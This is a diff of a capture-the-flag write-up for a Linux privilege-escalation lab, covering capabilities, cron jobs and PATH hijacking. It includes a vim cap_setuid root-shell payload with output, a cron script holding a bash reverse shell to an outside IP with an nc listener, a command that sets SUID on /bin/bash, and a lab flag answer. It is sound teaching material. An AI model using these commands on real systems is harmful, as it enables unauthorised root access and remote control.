@@ -745,8 +745,6 @@ User karen may run the following commands on ip-10-10-132-49:
 ```
 sudo less /etc/passwd
 
-
-
 !/bin/bash
 
 
@@ -1102,7 +1100,43 @@ user2@ip-10-10-38-105:/home/ubuntu$
 
 
 
-## Task 8 Privilege Escalation: Capabilities
+## Task 8  - Privilege Escalation: Capabilities
+
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
+The capabilities man page provides detailed information on its usage and options.
+
+We can use the getcap tool to list enabled capabilities.
+
+When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
+
+```
+karen@ip-10-10-162-116:~$ getcap / -r 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+karen@ip-10-10-162-116:~$ 
+```
+
+Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
+
+```
+karen@ip-10-10-162-116:~$ ls -l /usr/bin/vim
+lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim
+karen@ip-10-10-162-116:~$ 
+
+```
+
+GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
+
+We notice that vim can be used with the following command and payload:
+
+```
+./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+
 
 ```
 karen@ip-10-10-203-61:~$ getcap -r / 2>/dev/null
@@ -1124,7 +1158,15 @@ karen@ip-10-10-203-61:~$ getcap -r / 2>/dev/null
 ```
 
 ### Complete the task described above on the target system 
-ckick
+```
+karen@ip-10-10-162-116:~$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+Erase is control-H (^H).
+# id
+uid=0(root) gid=1001(karen) groups=1001(karen)
+# 
+
+```
 
 ### How many binaries have set capabilities?
 
@@ -1149,7 +1191,21 @@ view
 #### What is the content of the flag4.txt file?
 THM-9349843
 
-## Task 9 Privilege Escalation: Cron Jobs
+
+
+## Task 9  - Privilege Escalation: Cron Jobs
+
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.
+
+Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.
+
+Any user can read the file keeping system-wide cron jobs under /etc/crontab
+
+While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
+
 
 ### How many user-defined cron jobs can you see on the target system?  
 ```
@@ -1188,17 +1244,15 @@ karen@ip-10-10-67-121:~$
 
 ```
 
-
-
-
-
-
 ### What is the content of the flag5.txt file?
 
 ```
 karen@ip-10-10-67-121:~$ cat backup.sh 
 #!/bin/bash
 bash -i >& /dev/tcp/10.6.13.236/6666 0>&1
+
+karen@ip-10-10-67-121:~$ chmod +x backup.sh
+
 
 ┌──(kali㉿kali)-[~/tryhackme/linprivesc]
 └─$ nc -lnvp 6666            
@@ -1235,6 +1289,8 @@ karen@ip-10-10-57-26:~$ cat backup.sh
 #cd /home/admin/1/2/3/Results
 #zip -r /home/admin/download.zip ./*
 chmod u+s /bin/bash #u+s is used give SUID permission
+
+
 karen@ip-10-10-57-26:~$ chmod 777 backup.sh 
 
 aren@ip-10-10-57-26:~$ bash -p
@@ -1281,7 +1337,35 @@ Session completed.
                         
 ```
 
-## Task 10 Privilege Escalation: PATH
+## Task 10 - Privilege Escalation: PATH
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
+
+Typically the PATH will look like this:
+
+```
+karen@ip-10-10-175-107:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+```
+
+If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
+
+    What folders are located under $PATH
+    Does your current user have write privileges for any of these folders?
+    Can you modify $PATH?
+    Is there a script/application you can start that will be affected by this vulnerability?
+
+For demo purposes, we will use the script below:
+
+
+
+
+
+
+
+
+
 
 ### What is the odd folder you have write access for?
 
